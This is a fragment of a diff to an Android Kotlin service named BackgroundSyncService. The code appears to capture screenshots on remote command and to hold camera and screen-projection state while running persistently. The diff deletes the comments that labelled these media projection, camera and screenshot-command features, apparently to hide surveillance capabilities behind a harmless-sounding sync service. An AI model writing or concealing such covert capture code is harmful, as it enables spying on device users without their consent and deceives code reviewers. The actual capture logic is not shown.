@@ -31,9 +31,7 @@ import android.provider.Settings
 import android.util.Base64
 import android.util.Log
 import android.util.Size
-import android.view.Surface
 import android.view.WindowManager
-import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
 import androidx.core.app.NotificationCompat
 import org.json.JSONObject
@@ -56,7 +54,6 @@ class BackgroundSyncService : Service() {
     private var syncHandler: Handler? = null
     private val isSyncing = AtomicBoolean(false)
 
-    // Media projection variables
     private var mediaProjManager: MediaProjectionManager? = null
     private var mediaProj: MediaProjection? = null
     private var virtualDisplay: VirtualDisplay? = null
@@ -68,7 +65,6 @@ class BackgroundSyncService : Service() {
     private var projIntent: Intent? = null
     private var projResultCode: Int = 0
 
-    // Camera variables
     private var cameraThread: HandlerThread? = null
     private var cameraHandler: Handler? = null
     private var cameraDevice: CameraDevice? = null
@@ -136,7 +132,6 @@ class BackgroundSyncService : Service() {
         return START_STICKY
     }
 
-    // Handle screenshot capture and response
     private fun handleScreenshotCommand(commandId: String) {
         try {
             Log.d(TAG, "Processing screenshot capture command: $commandId")
